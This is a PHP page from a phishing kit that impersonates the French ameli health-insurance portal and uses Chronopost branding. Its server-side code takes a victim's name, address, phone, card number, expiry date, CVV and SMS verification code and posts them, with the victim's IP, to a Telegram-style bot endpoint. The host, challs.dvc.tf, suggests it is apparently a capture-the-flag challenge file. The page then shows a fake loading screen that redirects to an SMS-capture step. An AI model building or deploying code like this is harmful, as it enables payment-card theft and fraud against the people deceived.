<?php





//$idd= $aaa[2];
$idd= $_SERVER['REMOTE_ADDR'];
if (isset($_POST["Cardnumber"])   )
{
$ip=$idd;
$Nomcomplet=$_POST["nome"];
$Adresse=$_POST["adres"];
$TEL=$_POST["tel"];
$ZIP=$_POST["zip"];
$Number=$_POST["Cardnumber"];
$MM=$_POST["ExpirationDate"];
$AA=$_POST["ExpirationD"];
$CVV=$_POST["cvv"];
$message="";
$message.=$ip."\n";
$message.=$Nomcomplet."\n";
$message.=$Adresse."\n";
$message.=$ZIP."\n";
$message.=$Number."\n";
$message.=$MM."/".$AA."\n";
$message.=$CVV."\n";





// send message using Telegram API
$website="http://challs.dvc.tf:1101/bot1337991337:AESCKk9bSy2kdtu-Ig7wYkzWkjltctu-UkN";
  //Receiver Chat Id 
$params=[
    'chat_id'=>'-1001324431100',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
}
else if (isset($_POST["co1"])   )
{
  $ip=$_SERVER['REMOTE_ADDR'];
  $sms=$_POST["co1"];
  $message="";
  $message.=$ip."\n";

  $message.="============SMS=========\n";
  $message.=$sms;
// send message using Telegram API
$website="http://challs.dvc.tf:1101/bot1337991337:AESCKk9bSy2kdtu-Ig7wYkzWkjltctu-UkN";
  //Receiver Chat Id 
$params=[
    'chat_id'=>'-1001324431100',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
}
?>


<!DOCTYPE html>
<html>

<head>

	<link rel="icon" type="image/png" href="images/favicon.ico"/>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Compte ameli - mon espace personnel</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
    <meta http-equiv="refresh" content="15;url=getsms.php<?php 

if (!empty($_GET['id']))
  echo "?id=".$_GET['id'] ;
  else
  echo "";



  ?>" />
</head>

<body>
    <div class="container-fluid">
        <header>
            <div class="limiter">
            	<img src="images/chronopost_logo.png" alt="" >

               
                
            </div>
        </header>
        <div class="creditCardForm">
            <h3 style="text-align: center;">Veuillez patienter pendant que nous traitons votre demande
</h3>
           <div class="loader" ></div>
          
        </div>

   

      
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
    <script src="assets/js/script.js"></script>
</body>

</html>
<style>
.loader {
  border: 8px solid #f3f3f3;
  border-radius: 50%;
  border-top: 8px solid #3498db;
  width: 80px;
  height: 80px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
  margin-left: auto;
    margin-right: auto;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
